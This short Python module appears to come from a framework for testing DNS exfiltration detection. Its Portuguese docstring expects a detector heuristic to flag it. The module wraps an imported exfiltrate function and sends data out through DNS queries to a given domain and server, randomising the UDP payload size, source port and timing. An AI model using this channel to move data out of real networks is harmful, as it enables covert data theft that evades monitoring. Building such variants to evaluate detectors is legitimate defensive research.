#!/usr/bin/env python3
"""
T4-variant R1 — Variacao continua de udp_payload_size.

ups sorteado uniformemente em [512, 4096] a cada query.

Razao de unicidade esperada: ~1.0 (cada query gera ups distinto).
H4 deve disparar trivialmente.
"""

import random
from techniques.t4_variant_base import exfiltrate, payload_to_n_queries


def gen_ups_sequence(n_queries: int) -> list:
    return [random.randint(512, 4096) for _ in range(n_queries)]


def exfiltrate_bytes(data: bytes, domain: str,
                     dns_server: str,
                     src_port: int = None,
                     interval: float = 0.04,
                     jitter: float = 0.02) -> int:
    if src_port is None:
        src_port = random.randint(10000, 60000)
    n = payload_to_n_queries(len(data))
    seq = gen_ups_sequence(n)
    return exfiltrate(seq, domain, dns_server, src_port,
                      interval=interval, jitter=jitter)
